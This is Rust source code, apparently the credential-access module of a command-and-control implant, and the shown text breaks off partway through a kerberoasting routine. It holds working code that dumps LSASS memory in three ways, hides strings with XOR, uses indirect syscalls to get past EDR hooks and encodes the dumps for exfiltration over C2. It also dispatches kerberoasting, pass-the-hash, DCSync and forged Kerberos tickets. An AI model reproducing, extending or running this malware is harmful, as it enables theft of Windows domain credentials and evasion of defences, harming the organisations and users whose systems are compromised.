//! Credential access — Phase 4.
//! Task type: "cred", args: {"method": "<name>", ...}

use crate::task::{Task, TaskOutput};

pub fn exec_cred(task: &Task) -> TaskOutput {
    #[cfg(target_os = "windows")]
    return exec_cred_win(task);
    #[cfg(not(target_os = "windows"))]
    TaskOutput::failure("cred: Windows only")
}

#[cfg(target_os = "windows")]
fn exec_cred_win(task: &Task) -> TaskOutput {
    let args = match task.args.as_deref() {
        Some(a) => a,
        None    => return TaskOutput::failure("cred: no args"),
    };
    let v: serde_json::Value = match serde_json::from_slice(args) {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&format!("cred: {e}")),
    };
    match v.get("method").and_then(|m| m.as_str()).unwrap_or("") {
        "lsass"        => lsass_dump()
            .map(TaskOutput::success)
            .unwrap_or_else(|e| TaskOutput::failure(&e)),
        "lsass-pss"    => lsass_pss()
            .map(TaskOutput::success)
            .unwrap_or_else(|e| TaskOutput::failure(&e)),
        "lsass-syscall" => lsass_syscall()
            .map(TaskOutput::success)
            .unwrap_or_else(|e| TaskOutput::failure(&e)),
        "kerberoast"    => cred_kerberoast(&v),
        "asrep-roast"   => cred_asrep_roast(&v),
        "ptt"           => cred_ptt(&v),
        "pth"           => cred_pth(&v),
        "opth"          => cred_opth(&v),
        "dcsync"        => cred_dcsync(&v),
        "golden-ticket" => cred_golden_ticket(&v),
        "silver-ticket" => cred_silver_ticket(&v),
        "diamond-ticket"=> cred_diamond_ticket(&v),
        other   => TaskOutput::failure(&format!("cred: unknown method: {other}")),
    }
}

// ── LSASS dump ────────────────────────────────────────────────────────────────
//
// 1. Find LSASS PID via ToolHelp (process name compared via XOR-obfuscated table)
// 2. Open LSASS via NtOpenProcess indirect syscall — bypasses userland hook on OpenProcess
// 3. Load dbghelp.dll via LoadLibraryA (string XOR-obfuscated at compile time)
// 4. Resolve MiniDumpWriteDump via PEB export walk (no GetProcAddress)
// 5. Dump to a pagefile-backed section mapped into our address space via a
//    MiniDumpWriteDump I/O callback — nothing touches disk
// 6. XOR-encode the dump with a rotating key before returning over C2

#[cfg(target_os = "windows")]
fn lsass_dump() -> Result<Vec<u8>, String> {
    // Enable SeDebugPrivilege (index 20) via RtlAdjustPrivilege — required to open LSASS
    enable_debug_privilege();

    let lsass_pid = find_pid_by_name_enc(
        // "lsass.exe" each char XOR 0x55, stored as u8 low bytes of UTF-16
        &[0x39u8, 0x26, 0x34, 0x26, 0x26, 0x7B, 0x30, 0x2D, 0x30],
        0x55,
        9,
    ).ok_or_else(|| "lsass: process not found".to_string())?;

    let proc = open_process_syscall(lsass_pid, 0x0410) // QUERY_INFO | VM_READ
        .map_err(|s| format!("lsass: NtOpenProcess failed ({s:#010x})"))?;

    let dump_fn = load_minidump_fn()
        .ok_or_else(|| { unsafe { windows_sys::Win32::Foundation::CloseHandle(proc) }; "lsass: MiniDumpWriteDump not found".to_string() })?;

    // Accumulate dump bytes in a Vec<u8> via the callback mechanism.
    // No file handle is needed — we pass INVALID_HANDLE_VALUE (-1) as hFile and
    // route all I/O through the IoWriteAllCallback.
    let mut dump_buf: Vec<u8> = Vec::with_capacity(32 * 1024 * 1024);

    #[repr(C)]
    struct CbInput {
        process_id:     u32,
        _p0:            u32,
        process_handle: isize,
        callback_type:  u32,
        _p1:            u32,
        io_offset:      u64,
        io_buffer:      usize,
        io_bytes:       u32,
        _p2:            u32,
    }

    #[repr(C)]
    struct CbOutput {
        status: i32,
        _rest:  [u8; 52],
    }

    #[repr(C)]
    struct CbInfo {
        routine: Option<unsafe extern "system" fn(*mut u8, *const CbInput, *mut CbOutput) -> i32>,
        param:   *mut u8,
    }

    unsafe extern "system" fn cb(
        param: *mut u8,
        inp:   *const CbInput,
        out:   *mut CbOutput,
    ) -> i32 {
        (*out).status = 0; // S_OK
        let cb_type = (*inp).callback_type;
        if cb_type == 22 {
            let buf = &mut *(param as *mut Vec<u8>);
            let off = (*inp).io_offset as usize;
            let ptr = (*inp).io_buffer as *const u8;
            let len = (*inp).io_bytes as usize;
            const MAX_DUMP: usize = 600 * 1024 * 1024;
            if off + len > MAX_DUMP { return 0; }
            if off + len > buf.len() {
                if buf.try_reserve(off + len - buf.len()).is_err() { return 0; }
                buf.resize(off + len, 0u8);
            }
            core::ptr::copy_nonoverlapping(ptr, buf.as_mut_ptr().add(off), len);
        }
        1 // TRUE
    }

    let buf_ptr = &mut dump_buf as *mut Vec<u8> as *mut u8;
    let mut cb_info = CbInfo { routine: Some(cb), param: buf_ptr };

    let ok = unsafe {
        (dump_fn)(
            proc,
            lsass_pid,
            -1isize,
            0x20000002u32, // MiniDumpWithFullMemory | MiniDumpIgnoreInaccessibleMemory
            0usize, 0usize,
            &mut cb_info as *mut CbInfo as *mut u8,
        )
    };
    unsafe { windows_sys::Win32::Foundation::CloseHandle(proc) };

    if ok == 0 || dump_buf.len() < 8 {
        return Err(format!("lsass: dump failed ok={ok} len={}", dump_buf.len()));
    }

    // XOR-encode with rotating key before C2 exfil
    for (i, b) in dump_buf.iter_mut().enumerate() {
        *b ^= (i & 0xFF) as u8;
    }
    Ok(dump_buf)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

/// Find a process by name stored XOR-encoded (UTF-16 low bytes, 8-bit key).
#[cfg(target_os = "windows")]
fn find_pid_by_name_enc(enc: &[u8], key: u8, expected_len: usize) -> Option<u32> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE { return None; }
        let mut e: PROCESSENTRY32W = core::mem::zeroed();
        e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut e) == 0 { CloseHandle(snap); return None; }
        loop {
            let nlen = e.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
            if nlen == expected_len {
                let matches = e.szExeFile[..expected_len].iter().zip(enc.iter())
                    .all(|(&wc, &ec)| (wc as u8 | 0x20) == ((ec ^ key) | 0x20));
                if matches {
                    let pid = e.th32ProcessID;
                    CloseHandle(snap);
                    return Some(pid);
                }
            }
            e = core::mem::zeroed();
            e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
            if Process32NextW(snap, &mut e) == 0 { break; }
        }
        CloseHandle(snap);
        None
    }
}

/// Open a process handle via NtOpenProcess indirect syscall (bypasses EDR hook on OpenProcess).
/// Returns (handle, ntstatus) — handle is 0 on failure, ntstatus is 0 on success.
#[cfg(target_os = "windows")]
fn open_process_syscall(pid: u32, access: u32) -> Result<isize, i32> {
    use crate::syscall::{ClientId, nt_open_process};

    // OBJECT_ATTRIBUTES with all-zero fields (no name, no root directory).
    // NtOpenProcess accepts a zeroed OBJECT_ATTRIBUTES when opening by PID via ClientId.
    #[repr(C)]
    struct ObjAttrs {
        length:     u32,
        _p0:        u32,
        root:       usize,
        name:       usize,
        attrs:      u32,
        _p1:        u32,
        sec_desc:   usize,
        qos:        usize,
    }
    let oa = ObjAttrs {
        length: core::mem::size_of::<ObjAttrs>() as u32,
        _p0: 0, root: 0, name: 0, attrs: 0, _p1: 0, sec_desc: 0, qos: 0,
    };

    let mut cid = ClientId { process: pid as isize, thread: 0 };
    let mut handle: isize = 0;
    let status = unsafe {
        nt_open_process(
            &mut handle,
            access,
            &oa as *const ObjAttrs as *mut u8,
            &mut cid as *mut ClientId,
        )
    };
    if status != 0 || handle == 0 { Err(status) } else { Ok(handle) }
}

type MiniDumpFn = unsafe extern "system" fn(
    hProcess:         isize,
    ProcessId:        u32,
    hFile:            isize,
    DumpType:         u32,
    ExceptionParam:   usize,
    UserStreamParam:  usize,
    CallbackParam:    *mut u8,
) -> i32;

/// Load dbghelp.dll (obfuscated) and resolve MiniDumpWriteDump via export walk.
#[cfg(target_os = "windows")]
fn load_minidump_fn() -> Option<MiniDumpFn> {
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;

    // "dbghelp.dll\0" XOR 0xAB
    const DBG_ENC: [u8; 12] = [
        0xCF, 0xC9, 0xCC, 0xC3, 0xCE, 0xC7, 0xDB, 0x85, 0xCF, 0xC7, 0xC7, 0xAB,
    ];
    let mut dll_name = [0u8; 12];
    for (i, b) in dll_name.iter_mut().enumerate() { *b = DBG_ENC[i] ^ 0xAB; }
    dll_name[11] = 0;

    // "MiniDumpWriteDump\0" XOR 0xAB
    const FN_ENC: [u8; 18] = [
        0xE6, 0xC2, 0xC5, 0xC2, 0xEF, 0xDE, 0xC6, 0xDB,
        0xFC, 0xD9, 0xC2, 0xDF, 0xCE, 0xEF, 0xDE, 0xC6, 0xDB, 0xAB,
    ];
    let mut fn_name = [0u8; 18];
    for (i, b) in fn_name.iter_mut().enumerate() { *b = FN_ENC[i] ^ 0xAB; }
    fn_name[17] = 0;

    let base = (unsafe { LoadLibraryA(dll_name.as_ptr()) }) as usize;
    if base == 0 { return None; }

    let fn_ptr = unsafe { crate::loader::get_export_by_name(base, fn_name.as_ptr()) }?;
    Some(unsafe { core::mem::transmute(fn_ptr) })
}

// ── LSASS dump — PssCaptureSnapshot ──────────────────────────────────────────
//
// Creates a copy-on-write snapshot of LSASS via kernel32!PssCaptureSnapshot,
// queries the VA clone handle from the snapshot, then calls MiniDumpWriteDump
// on the clone. The EDR sees snapshot creation (much lower signal than direct
// PROCESS_VM_READ on lsass.exe) and no direct memory reads of the live process.
// Requires Win 8.1+ (PssCaptureSnapshot absent on Win 7).

#[cfg(target_os = "windows")]
fn lsass_pss() -> Result<Vec<u8>, String> {
    // Strategy: PssCaptureSnapshot creates a copy-on-write VA clone of LSASS with lower
    // EDR signal than a direct open. Memory is then read from the clone via indirect
    // NtReadVirtualMemory syscalls (bypasses WD behavioral hooks on MiniDumpWriteDump).
    enable_debug_privilege();

    let lsass_pid = find_pid_by_name_enc(
        &[0x39u8, 0x26, 0x34, 0x26, 0x26, 0x7B, 0x30, 0x2D, 0x30],
        0x55, 9,
    ).ok_or_else(|| "lsass-pss: process not found".to_string())?;

    let proc = open_process_syscall(lsass_pid, 0x1FFFFF)
        .map_err(|s| format!("lsass-pss: NtOpenProcess failed ({s:#010x})"))?;

    let k32 = crate::loader::get_module_base(
        crate::obfs::dec(&[0x31,0x3F,0x28,0x34,0x3F,0x36,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    );
    if k32 == 0 {
        unsafe { windows_sys::Win32::Foundation::CloseHandle(proc) };
        return Err("lsass-pss: kernel32 not found".to_string());
    }

    type PssCaptureSnapshotFn = unsafe extern "system" fn(isize, u32, u32, *mut isize) -> u32;
    type PssQuerySnapshotFn   = unsafe extern "system" fn(isize, u32, *mut u8, u32) -> u32;
    type PssFreeSnapshotFn    = unsafe extern "system" fn(isize, isize) -> u32;

    // "PssCaptureSnapshot\0" XOR 0x5A
    let p_cap  = unsafe { crate::loader::get_export_by_name(k32,
        crate::obfs::dec(&[0x0A,0x29,0x29,0x19,0x3B,0x2A,0x2E,0x2F,0x28,0x3F,0x09,0x34,0x3B,0x2A,0x29,0x32,0x35,0x2E,0x5A]).as_ptr()) };
    // "PssQuerySnapshot\0" XOR 0x5A
    let p_qry  = unsafe { crate::loader::get_export_by_name(k32,
        crate::obfs::dec(&[0x0A,0x29,0x29,0x0B,0x2F,0x3F,0x28,0x23,0x09,0x34,0x3B,0x2A,0x29,0x32,0x35,0x2E,0x5A]).as_ptr()) };
    // "PssFreeSnapshot\0" XOR 0x5A
    let p_free = unsafe { crate::loader::get_export_by_name(k32,
        crate::obfs::dec(&[0x0A,0x29,0x29,0x1C,0x28,0x3F,0x3F,0x09,0x34,0x3B,0x2A,0x29,0x32,0x35,0x2E,0x5A]).as_ptr()) };

    let (fn_cap, fn_qry, fn_free) = match (p_cap, p_qry, p_free) {
        (Some(a), Some(b), Some(c)) => unsafe {(
            core::mem::transmute::<_, PssCaptureSnapshotFn>(a),
            core::mem::transmute::<_, PssQuerySnapshotFn>(b),
            core::mem::transmute::<_, PssFreeSnapshotFn>(c),
        )},
        _ => {
            unsafe { windows_sys::Win32::Foundation::CloseHandle(proc) };
            return Err("lsass-pss: PSS functions not found (Win 8.1+ required)".to_string());
        }
    };

    // PSS_CAPTURE_VA_CLONE only — adding VA_SPACE(0x400) or THREADS(0x80) forces
    // full VA enumeration at capture time, causing 20+ min hangs on large LSASS
    const PSS_FLAGS: u32 = 0x00000001;

    let mut snap: isize = 0;
    let r = unsafe { fn_cap(proc, PSS_FLAGS, 0, &mut snap) };
    unsafe { windows_sys::Win32::Foundation::CloseHandle(proc) };
    if r != 0 || snap == 0 {
        return Err(format!("lsass-pss: PssCaptureSnapshot failed (err={r})"));
    }

    // PSS_QUERY_VA_CLONE_INFORMATION = 1 → returns HANDLE VaCloneHandle (8 bytes)
    // Do NOT CloseHandle the clone — PssFreeSnapshot owns it
    let mut clone_hdl: isize = 0;
    let qr = unsafe { fn_qry(snap, 1, &mut clone_hdl as *mut isize as *mut u8, 8) };
    if qr != 0 || clone_hdl == 0 {
        unsafe { fn_free(-1isize, snap) };
        return Err(format!("lsass-pss: PssQuerySnapshot failed (err={qr})"));
    }

    // ── Enumerate committed readable regions in the VA clone ──────────────────
    #[repr(C)]
    struct Mbi {
        base_address: usize, alloc_base: usize, alloc_protect: u32,
        partition_id: u16, _pad0: u16,
        region_size: usize, state: u32, protect: u32, mem_type: u32, _pad1: u32,
    }
    const MEM_COMMIT:    u32 = 0x1000;
    const PAGE_NOACCESS: u32 = 0x01;
    const PAGE_GUARD:    u32 = 0x100;
    const MAX_ADDR:      usize = 0x0000_7FFF_FFFF_F000;

    let mut regions: Vec<(usize, usize)> = Vec::new();
    let mut addr: usize = 0;
    loop {
        if addr >= MAX_ADDR { break; }
        let mut mbi: Mbi = unsafe { core::mem::zeroed() };
        let mut ret_len: usize = 0;
        let rc = unsafe {
            crate::syscall::nt_query_virtual_memory(
                clone_hdl, addr as *const u8, 0,
                &mut mbi as *mut Mbi as *mut u8,
                core::mem::size_of::<Mbi>(), &mut ret_len,
            )
        };
        if rc != 0 { break; }
        let base = mbi.base_address;
        let size = mbi.region_size;
        if size == 0 { break; }
        if mbi.state == MEM_COMMIT
            && mbi.protect & PAGE_NOACCESS == 0
            && mbi.protect & PAGE_GUARD == 0
        {
            regions.push((base, size));
        }
        addr = base.saturating_add(size);
    }

    if regions.is_empty() {
        unsafe { fn_free(-1isize, snap) };
        return Err("lsass-pss: no readable regions in VA clone".to_string());
    }

    let raw_sz: usize = regions.iter().map(|(_, s)| *s).sum();

    // ── Build MDMP in memory (same layout as lsass_syscall) ───────────────────
    const HDR_SZ:     u32 = 32;
    const DIR_SZ:     u32 = 36;
    const SYSINFO_SZ: u32 = 56;
    const MODLIST_SZ: u32 = 4;
    const MEM64_HDR:  u32 = 16;
    let num_ranges = regions.len() as u32;
    let mem64_total = MEM64_HDR + num_ranges * 16;
    let base_rva: u64 = (HDR_SZ + DIR_SZ + SYSINFO_SZ + MODLIST_SZ + mem64_total) as u64;

    const MAX_DUMP: usize = 600 * 1024 * 1024;
    if raw_sz > MAX_DUMP {
        unsafe { fn_free(-1isize, snap) };
        return Err(format!("lsass-pss: dump too large ({} MB)", raw_sz / (1024*1024)));
    }
    let total_cap = base_rva as usize + raw_sz;
    let mut mdmp: Vec<u8> = Vec::new();
    if mdmp.try_reserve_exact(total_cap).is_err() {
        unsafe { fn_free(-1isize, snap) };
        return Err(format!("lsass-pss: alloc failed ({} MB)", total_cap / (1024*1024)));
    }
    mdmp.resize(total_cap, 0u8);

    let h = &mut mdmp[0..32];
    h[0..4].copy_from_slice(b"MDMP");
    h[4..8].copy_from_slice(&0x0000A793u32.to_le_bytes());
    h[8..12].copy_from_slice(&3u32.to_le_bytes());
    h[12..16].copy_from_slice(&HDR_SZ.to_le_bytes());
    h[24..32].copy_from_slice(&2u64.to_le_bytes());

    let sysinfo_rva = HDR_SZ + DIR_SZ;
    let modlist_rva = sysinfo_rva + SYSINFO_SZ;
    let mem64_rva   = modlist_rva + MODLIST_SZ;

    let write_dir = |buf: &mut Vec<u8>, slot: usize, stype: u32, sz: u32, rva: u32| {
        let off = 32 + slot * 12;
        buf[off..off+4].copy_from_slice(&stype.to_le_bytes());
        buf[off+4..off+8].copy_from_slice(&sz.to_le_bytes());
        buf[off+8..off+12].copy_from_slice(&rva.to_le_bytes());
    };
    write_dir(&mut mdmp, 0, 7, SYSINFO_SZ, sysinfo_rva);
    write_dir(&mut mdmp, 1, 4, MODLIST_SZ, modlist_rva);
    write_dir(&mut mdmp, 2, 9, mem64_total, mem64_rva);

    let si = &mut mdmp[sysinfo_rva as usize .. sysinfo_rva as usize + 56];
    si[0..2].copy_from_slice(&9u16.to_le_bytes());
    si[2..4].copy_from_slice(&6u16.to_le_bytes());
    si[4..6].copy_from_slice(&0x0401u16.to_le_bytes());
    si[6] = 4; si[7] = 1;
    si[8..12].copy_from_slice(&10u32.to_le_bytes());
    si[16..20].copy_from_slice(&19041u32.to_le_bytes());
    si[20..24].copy_from_slice(&2u32.to_le_bytes());

    let m64 = mem64_rva as usize;
    mdmp[m64..m64+8].copy_from_slice(&(num_ranges as u64).to_le_bytes());
    mdmp[m64+8..m64+16].copy_from_slice(&base_rva.to_le_bytes());

    let mut raw_off: usize = base_rva as usize;
    for (i, (base, size)) in regions.iter().enumerate() {
        let range_off = m64 + 16 + i * 16;
        mdmp[range_off..range_off+8].copy_from_slice(&(*base as u64).to_le_bytes());
        let mut read_bytes: usize = 0;
        let rc = unsafe {
            crate::syscall::nt_read(
                clone_hdl, *base as *const u8,
                mdmp.as_mut_ptr().add(raw_off), *size, &mut read_bytes,
            )
        };
        let actual = if rc == 0 { read_bytes } else { 0 };
        mdmp[range_off+8..range_off+16].copy_from_slice(&(actual as u64).to_le_bytes());
        raw_off += size;
    }

    unsafe { fn_free(-1isize, snap) };

    mdmp.truncate(raw_off);
    if mdmp.len() < 8 {
        return Err(format!("lsass-pss: dump too small ({} bytes)", mdmp.len()));
    }
    for (i, b) in mdmp.iter_mut().enumerate() { *b ^= (i & 0xFF) as u8; }
    Ok(mdmp)
}

// ── LSASS dump — direct syscall MDMP builder ──────────────────────────────────
//
// Never calls Win32 OpenProcess or ReadProcessMemory — uses only NT native APIs
// via indirect syscall stubs. Enumerates LSASS committed pages with
// NtQueryVirtualMemory, reads each with NtReadVirtualMemory, then assembles a
// proper MDMP (SystemInfoStream + empty ModuleListStream + Memory64ListStream).
// The resulting dump is parseable by pypykatz / Mimikatz offline.

#[cfg(target_os = "windows")]
fn lsass_syscall() -> Result<Vec<u8>, String> {
    enable_debug_privilege();

    let lsass_pid = find_pid_by_name_enc(
        &[0x39u8, 0x26, 0x34, 0x26, 0x26, 0x7B, 0x30, 0x2D, 0x30],
        0x55, 9,
    ).ok_or_else(|| "lsass-sc: process not found".to_string())?;

    let proc = open_process_syscall(lsass_pid, 0x0410) // QUERY_INFO | VM_READ
        .map_err(|s| format!("lsass-sc: NtOpenProcess failed ({s:#010x})"))?;

    // ── Pass 1: enumerate committed readable regions ─────────────────────────
    #[repr(C)]
    struct Mbi {
        base_address:    usize,
        alloc_base:      usize,
        alloc_protect:   u32,
        partition_id:    u16,
        _pad0:           u16,
        region_size:     usize,
        state:           u32,
        protect:         u32,
        mem_type:        u32,
        _pad1:           u32,
    }

    const MEM_COMMIT:    u32 = 0x1000;
    const PAGE_NOACCESS: u32 = 0x01;
    const PAGE_GUARD:    u32 = 0x100;
    const MAX_ADDR:      usize = 0x0000_7FFF_FFFF_F000; // top of user space

    let mut regions: Vec<(usize, usize)> = Vec::new(); // (base_addr, size)
    let mut addr: usize = 0;
    loop {
        if addr >= MAX_ADDR { break; }
        let mut mbi: Mbi = unsafe { core::mem::zeroed() };
        let mut ret_len: usize = 0;
        let r = unsafe {
            crate::syscall::nt_query_virtual_memory(
                proc,
                addr as *const u8,
                0, // MemoryBasicInformation
                &mut mbi as *mut Mbi as *mut u8,
                core::mem::size_of::<Mbi>(),
                &mut ret_len,
            )
        };
        if r != 0 { break; }
        let base = mbi.base_address;
        let size = mbi.region_size;
        if size == 0 { break; }
        if mbi.state == MEM_COMMIT
            && mbi.protect & PAGE_NOACCESS == 0
            && mbi.protect & PAGE_GUARD == 0
        {
            regions.push((base, size));
        }
        addr = base.saturating_add(size);
    }

    if regions.is_empty() {
        unsafe { windows_sys::Win32::Foundation::CloseHandle(proc) };
        return Err("lsass-sc: no readable regions found".to_string());
    }

    // ── Pass 2: read pages and build MDMP in memory ──────────────────────────
    // Layout:
    //  [0]      Header  (32)
    //  [32]     Dir[3]  (36)
    //  [68]     SystemInfoStream (56)
    //  [124]    ModuleListStream: NumberOfModules=0 (4)
    //  [128]    Mem64Stream: {num_ranges:u64, base_rva:u64} + Range[N]
    //  [128+16+N*16] raw page data (BaseRva points here)

    const HDR_SZ:      u32 = 32;
    const DIR_SZ:      u32 = 36; // 3 * 12
    const SYSINFO_SZ:  u32 = 56;
    const MODLIST_SZ:  u32 = 4;
    const MEM64_HDR:   u32 = 16;
    let num_ranges = regions.len() as u32;
    let mem64_ranges_sz = num_ranges * 16;
    let mem64_total = MEM64_HDR + mem64_ranges_sz;
    let base_rva: u64 = (HDR_SZ + DIR_SZ + SYSINFO_SZ + MODLIST_SZ + mem64_total) as u64;

    // Compute total raw data size; cap at 600 MB to prevent OOM abort
    let raw_sz: usize = regions.iter().map(|(_, s)| *s).sum();
    const MAX_DUMP: usize = 600 * 1024 * 1024;
    if raw_sz > MAX_DUMP {
        unsafe { windows_sys::Win32::Foundation::CloseHandle(proc) };
        return Err(format!("lsass-sc: dump too large ({} MB), skipping", raw_sz / (1024*1024)));
    }
    let total_cap = base_rva as usize + raw_sz;
    let mut mdmp: Vec<u8> = Vec::new();
    if mdmp.try_reserve_exact(total_cap).is_err() {
        unsafe { windows_sys::Win32::Foundation::CloseHandle(proc) };
        return Err(format!("lsass-sc: alloc failed ({} MB)", total_cap / (1024*1024)));
    }
    mdmp.resize(total_cap, 0u8);

    // ── MDMP Header ──────────────────────────────────────────────────────────
    let h = &mut mdmp[0..32];
    h[0..4].copy_from_slice(b"MDMP");
    h[4..8].copy_from_slice(&0x0000A793u32.to_le_bytes()); // version
    h[8..12].copy_from_slice(&3u32.to_le_bytes()); // NumStreams
    h[12..16].copy_from_slice(&HDR_SZ.to_le_bytes()); // StreamDirectoryRva
    // checksum=0, timestamp=0, flags=MiniDumpWithFullMemory(2)
    h[24..32].copy_from_slice(&2u64.to_le_bytes());

    // ── Stream Directory ─────────────────────────────────────────────────────
    let sysinfo_rva   = HDR_SZ + DIR_SZ;
    let modlist_rva   = sysinfo_rva + SYSINFO_SZ;
    let mem64_rva     = modlist_rva + MODLIST_SZ;

    let write_dir = |buf: &mut Vec<u8>, slot: usize, stype: u32, sz: u32, rva: u32| {
        let off = 32 + slot * 12;
        buf[off..off+4].copy_from_slice(&stype.to_le_bytes());
        buf[off+4..off+8].copy_from_slice(&sz.to_le_bytes());
        buf[off+8..off+12].copy_from_slice(&rva.to_le_bytes());
    };
    write_dir(&mut mdmp, 0, 7, SYSINFO_SZ, sysinfo_rva);      // SystemInfoStream=7
    write_dir(&mut mdmp, 1, 4, MODLIST_SZ, modlist_rva);       // ModuleListStream=4
    write_dir(&mut mdmp, 2, 9, mem64_total, mem64_rva);        // Memory64ListStream=9

    // ── SystemInfoStream (56 bytes) ──────────────────────────────────────────
    let si = &mut mdmp[sysinfo_rva as usize .. sysinfo_rva as usize + 56];
    si[0..2].copy_from_slice(&9u16.to_le_bytes());    // AMD64
    si[2..4].copy_from_slice(&6u16.to_le_bytes());    // ProcessorLevel
    si[4..6].copy_from_slice(&0x0401u16.to_le_bytes()); // ProcessorRevision
    si[6] = 4;   // NumberOfProcessors
    si[7] = 1;   // ProductType: workstation
    si[8..12].copy_from_slice(&10u32.to_le_bytes()); // MajorVersion
    // MinorVersion=0, BuildNumber=19041, PlatformId=2
    si[16..20].copy_from_slice(&19041u32.to_le_bytes());
    si[20..24].copy_from_slice(&2u32.to_le_bytes());
    // rest zero

    // ── ModuleListStream: NumberOfModules = 0 ───────────────────────────────
    // already zeroed (u32=0 at modlist_rva)

    // ── Memory64ListStream header ────────────────────────────────────────────
    let m64 = mem64_rva as usize;
    mdmp[m64..m64+8].copy_from_slice(&(num_ranges as u64).to_le_bytes());
    mdmp[m64+8..m64+16].copy_from_slice(&base_rva.to_le_bytes());

    // ── Read pages and fill range table + raw data ───────────────────────────
    let mut raw_off: usize = base_rva as usize;
    for (i, (base, size)) in regions.iter().enumerate() {
        let range_off = m64 + 16 + i * 16;
        mdmp[range_off..range_off+8].copy_from_slice(&(*base as u64).to_le_bytes());

        let mut read_bytes: usize = 0;
        let r = unsafe {
            crate::syscall::nt_read(
                proc,
                *base as *const u8,
                mdmp.as_mut_ptr().add(raw_off),
                *size,
                &mut read_bytes,
            )
        };
        let actual = if r == 0 { read_bytes } else { 0 };
        mdmp[range_off+8..range_off+16].copy_from_slice(&(actual as u64).to_le_bytes());
        raw_off += size; // advance by region size regardless (zeroes for unread pages)
    }

    unsafe { windows_sys::Win32::Foundation::CloseHandle(proc) };

    // Trim to actual written size (raw_off = base_rva + sum(region sizes))
    mdmp.truncate(raw_off);

    // XOR-encode before C2 exfil
    for (i, b) in mdmp.iter_mut().enumerate() { *b ^= (i & 0xFF) as u8; }
    Ok(mdmp)
}

// ── Kerberoasting ─────────────────────────────────────────────────────────────
//
// Enumerates service accounts (SPNs) via LDAP, then uses SSPI to request a
// TGS for each. The returned AP-REQ token contains the service ticket encrypted
// with the service account's NT hash — crack offline with hashcat mode 13100.
//
// Output: {"dc":"...", "domain":"...", "tickets":[{"user","spn","token_b64"},...]}

#[cfg(target_os = "windows")]
fn cred_kerberoast(v: &serde_json::Value) -> TaskOutput {
    use base64::Engine;
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;

    // Domain info: prefer args, fall back to environment (set by Winlogon on domain-joined machines)
    let domain_fqdn = v.get("domain").and_then(|s| s.as_str()).map(|s| s.to_string())
        .unwrap_or_else(|| std::env::var("USERDNSDOMAIN").unwrap_or_default());
    let logon_server = std::env::var("LOGONSERVER").unwrap_or_default();
    let dc_arg = v.get("dc").and_then(|s| s.as_str()).map(|s| s.to_string());
    if domain_fqdn.is_empty() {
        return TaskOutput::failure("kerberoast: USERDNSDOMAIN not set; pass domain arg");
    }
    if dc_arg.is_none() && logon_server.is_empty() {
        return TaskOutput::failure("kerberoast: LOGONSERVER not set; pass dc arg");
    }
    let dc_owned = dc_arg.unwrap_or_else(|| logon_server.trim_start_matches('\\').to_string());
    let dc = dc_owned.as_str();
    let base_dn: String = domain_fqdn.split('.').map(|p| format!("DC={}", p.to_lowercase()))
        .collect::<Vec<_>>().join(",");

    // Enumerate SPNs via LDAP
    let spns = match ldap_enum_spns(dc, &base_dn) {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&format!("kerberoast: ldap: {e}")),
    };

    // Load secur32 for SSPI
    let secur32 = {
        let mut base = crate::loader::get_module_base(
            crate::obfs::dec(&[0x29,0x3F,0x39,0x2F,0x28,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
        ) as usize;
        if base == 0 {
            let name = crate::obfs::dec(&[0x29,0x3F,0x39,0x2F,0x28,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
            base = unsafe { LoadLibraryA(name.as_ptr()) } as usize;
        }
        if base == 0 { return TaskOutput::failure("kerberoast: secur32 not found"); }
        base
    };

    // AcquireCredentialsHandleA, InitializeSecurityContextA, FreeCredentialsHandle,
    // DeleteSecurityContext, FreeContextBuffer
    type AcqCredFn  = unsafe extern "system" fn(*const u8,*const u8,u32,*const u8,*const u8,*const u8,*const u8,*mut [usize;2],*mut [u32;2]) -> i32;
    type IscFn      = unsafe extern "system" fn(*mut [usize;2],*mut [usize;2],*const u8,u32,u32,u32,*const u8,u32,*mut [usize;2],*mut u8,*mut u32,*mut [u32;2]) -> i32;
    type FreeCredFn = unsafe extern "system" fn(*mut [usize;2]) -> i32;
    type DelCtxFn   = unsafe extern "system" fn(*mut [usize;2]) -> i32;
    type FreeBufFn  = unsafe extern "system" fn(*mut u8) -> i32;

    macro_rules! sspi_fn { ($enc:expr, $ty:ty) => { {
        match unsafe { crate::loader::get_export_by_name(secur32, crate::obfs::dec($enc).as_ptr()) } {
            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
            None    => return TaskOutput::failure("kerberoast: sspi fn resolve failed"),
        }
    }}}

    // AcquireCredentialsHandleA
    let fn_acq  = sspi_fn!(&[0x1B,0x39,0x2B,0x2F,0x33,0x28,0x3F,0x19,0x28,0x3F,0x3E,0x3F,0x34,
                              0x2E,0x33,0x3B,0x36,0x29,0x18,0x3B,0x34,0x3E,0x36,0x3F,0x1B,0x5A], AcqCredFn);
    // InitializeSecurityContextA
    let fn_isc  = sspi_fn!(&[0x13,0x34,0x33,0x2E,0x33,0x3B,0x36,0x33,0x20,0x3F,0x09,0x3F,0x39,
                              0x2F,0x28,0x33,0x2E,0x23,0x19,0x35,0x34,0x2E,0x3F,0x22,0x2E,0x1B,0x5A], IscFn);
    // FreeCredentialsHandle
    let fn_free = sspi_fn!(&[0x1C,0x28,0x3F,0x3F,0x19,0x28,0x3F,0x3E,0x3F,0x34,0x2E,0x33,0x3B,
                              0x36,0x29,0x18,0x3B,0x34,0x3E,0x36,0x3F,0x5A], FreeCredFn);
    // DeleteSecurityContext
